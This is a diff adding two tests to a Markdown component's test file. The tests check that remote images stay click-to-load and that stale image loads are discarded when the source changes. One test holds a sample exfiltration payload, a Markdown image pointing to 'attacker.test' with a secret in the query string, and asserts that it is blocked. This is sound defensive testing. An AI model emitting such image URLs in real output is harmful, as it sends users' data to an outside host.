@@ -93,6 +93,31 @@ describe("Markdown", () => {
     expect(networkImages(container)).toEqual([]);
     expect(preview).not.toHaveBeenCalled();
   });
+
+  it("asks again for a different image put where a loaded one was (#488)", async () => {
+    invoke.mockResolvedValueOnce(PNG);
+    const shown = (text: string) => <Markdown text={text} />;
+    const { container, rerender } = renderDom(shown("![a](https://one.test/a.png)"));
+    await userEvent.click(screen.getByRole("button", { name: /one\.test/ }));
+    await waitFor(() => expect(container.querySelector("img")?.getAttribute("src")).toBe(PNG));
+    rerender(shown("![a](https://attacker.test/?d=SECRET)"));
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByRole("button", { name: /attacker\.test, click to load/ })).toBeTruthy();
+    expect(invoke).toHaveBeenCalledTimes(1);
+  });
+
+  it("never shows an image that finishes loading after a different one took its place (#488)", async () => {
+    let answer!: (dataUrl: string) => void;
+    invoke.mockImplementationOnce(() => new Promise((resolve) => (answer = resolve)));
+    const shown = (text: string) => <Markdown text={text} />;
+    const { container, rerender } = renderDom(shown("![a](https://one.test/a.png)"));
+    await userEvent.click(screen.getByRole("button", { name: /one\.test/ }));
+    rerender(shown("![a](https://two.test/b.png)"));
+    act(() => answer(PNG));
+    await Promise.resolve();
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByRole("button", { name: /two\.test, click to load/ })).toBeTruthy();
+  });
 });
 
 describe("A link's tooltip (#471)", () => {
